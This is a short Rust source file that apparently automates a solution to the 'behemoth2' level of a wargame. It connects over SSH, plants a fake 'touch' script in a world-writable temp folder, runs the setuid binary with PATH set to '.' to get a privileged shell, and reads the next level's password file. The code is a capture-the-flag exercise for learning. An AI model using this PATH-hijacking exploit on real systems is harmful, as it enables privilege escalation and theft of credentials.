use crate::util::*;
use anyhow::Result;

/// behemoth2 calls 'touch' unqualified to create a file with the name of its PID. it then waits two seconds before executing the file's contents
/// while this could be exploited by perhaps writing some command into the file (once the pid is determined), it is simpler to hijack touch via path injection
pub fn solve(password: &str) -> Result<String> {

    let mut ssh = SSHShell::connect(super::HOST, super::PORT, "behemoth2", password)?;
    ssh.read_until("$ ")?;

    println!("creating a writable tmp folder and moving to it");
    ssh.write_line("cd $(mktemp -d) && chmod 777 $(pwd)")?;
    ssh.read_until("$ ")?;

    let exploit = "echo \"/bin/sh\" > touch && chmod +x touch && PATH=. /behemoth/behemoth2";
    println!("running '{exploit}' to get a suid shell");
    ssh.write_line(&exploit)?;
    ssh.read_until("$ ")?;

    println!("reading password");
    ssh.write_line("/bin/cat /etc/behemoth_pass/behemoth3")?; // note because we murdered PATH, we need to use the qualified path to 'cat' to call it
    let result = ssh.read_until("$ ")?;
    let result: Vec<&str> = result.split("\n").collect();
    let result = result[result.len() - 2].trim();

    println!("retrieved behemoth3 pass '{result}'\n");

    Ok(result.to_string())
}
